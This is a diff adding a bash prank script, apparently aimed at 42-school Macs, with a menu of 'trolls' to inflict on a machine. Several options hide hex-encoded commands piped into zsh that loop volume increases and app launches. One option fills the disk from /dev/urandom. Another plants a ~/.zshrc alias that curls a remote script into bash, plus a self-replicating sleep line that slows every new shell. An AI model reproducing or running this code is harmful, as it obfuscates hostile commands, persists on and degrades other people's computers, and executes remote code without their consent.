@@ -1,0 +1,30 @@
+#!/bin/bash
+result=`osascript -e 'return choose from list {"🎸 Play Song Max Volume 🎺", "🦜 Parrot Party 🦜", "💥 Fill Memory 📝", "🕺 Rick Roll & Sleep alias 💤", "🦆 Exec Goose 🦆", "🦆 Exec Goose (Every 5mins) 🦆", "ق Arabian Cat 😼", "🛑 Stop trolls 🛑", "🌦 Tiempo en Madrid 🌦"}'`
+if [[ "$result" = "🎸 Play Song Max Volume 🎺" ]]; then
+	echo 6465636c617265202d6920693b20693d35202626207768696c6520747275653b20646f206f7361736372697074202d65202273657420766f6c756d65206f757470757420766f6c756d65202469223b20692b3d353b20736c65657020323b20646f6e652026 | xxd -r -p | zsh
+	afplay /sgoinfre/students/psegura-/42trolls/sicko.mp3
+elif [[ "$result" = "🦜 Parrot Party 🦜" ]]; then
+	echo 666f72206920696e207b312e2e357d3b20646f2062617368202f73676f696e6672652f73747564656e74732f707365677572612d2f343274726f6c6c732f636f6d6d616e645f7461622e736820226375726c20706172726f742e6c697665223b20736c65657020323b20646f6e652026 | xxd -r -p | zsh
+elif [[ "$result" = "💥 Fill Memory 📝" ]]; then
+	cat /dev/urandom >> ~/Desktop/psegura_was_here
+elif [[ "$result" = "🕺 Rick Roll & Sleep alias 💤" ]]; then
+	echo "alias ./a.out='curl -s -L https://raw.githubusercontent.com/keroserene/rickrollrc/master/roll.sh | bash && ./a.out \$1'" >> ~/.zshrc
+	echo 'echo sleep 0.3 >> ~/.zshrc' >> ~/.zshrc
+elif [[ "$result" = "🦆 Exec Goose 🦆" ]]; then
+	/sgoinfre/students/psegura-/42trolls/goose/goose.app/Contents/MacOS/Desktop\ Goose &
+elif [[ "$result" = "🦆 Exec Goose (Every 5mins) 🦆" ]]; then
+	echo 7768696c6520747275653b20646f202f73676f696e6672652f73747564656e74732f707365677572612d2f343274726f6c6c732f676f6f73652f676f6f73652e6170702f436f6e74656e74732f4d61634f532f4465736b746f705c20476f6f736520263b20736c656570203330303b20646f6e652026 | xxd -r -p | zsh
+elif [[ "$result" = "ق Arabian Cat 😼" ]]; then
+	osascript -e "set volume output volume 50"
+	/Applications/VLC.app/Contents/MacOS/VLC -f /sgoinfre/students/psegura-/42trolls/Arabian_cat.mp4
+elif [[ "$result" = "🛑 Stop trolls 🛑" ]]; then
+	osascript -e "set volume output volume 10"
+	killall zsh
+	killall Desktop\ Goose
+	killall afplay
+	vim -es -c "g/sleep 0.3/d" -c "wq" ~/.zshrc
+	vim -es -c "g/afplay/d" -c "wq" ~/.zshrc
+	vim -es -c "g/a.out='curl /d" -c "wq" ~/.zshrc
+elif [[ "$result" = "🌦 Tiempo en Madrid 🌦" ]]; then
+	bash /sgoinfre/students/psegura-/42trolls/command_tab.sh "curl wttr.in/Madrid"
+fi
